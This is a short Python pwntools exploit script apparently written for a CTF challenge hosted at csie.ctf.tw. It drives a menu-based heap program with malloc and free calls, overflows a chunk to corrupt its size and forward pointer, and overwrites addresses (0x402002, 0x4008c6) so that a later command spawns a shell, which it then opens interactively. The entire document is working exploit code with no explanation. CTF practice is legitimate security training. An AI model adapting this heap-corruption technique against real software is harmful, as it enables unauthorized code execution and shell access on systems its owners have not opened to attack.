from pwn import *

#r = remote('localhost',8888)
r = remote('csie.ctf.tw',10151)
def cmd(x):
  r.recvuntil('> ')
  r.send(x+'\n')

def malloc(i,l,s):
  cmd('1 %d %d\n%s' % (i, l, s))

def free(i):
  cmd('2 %d' % i)

chunksize = 0x40-0x8

raw_input('@')
malloc(1, chunksize, 'deadbeef')
malloc(2, chunksize, 'deadbeef')
free(2)
free(1)
malloc(1, chunksize, "A"*(chunksize)+p64(0x41)+p64(0x402002))
malloc(2, chunksize, 'sh\0')
malloc(1, chunksize, '\x40'+'\x00'*5+'B'*16+p64(0x4008c6))
cmd('3 2');
r.interactive()

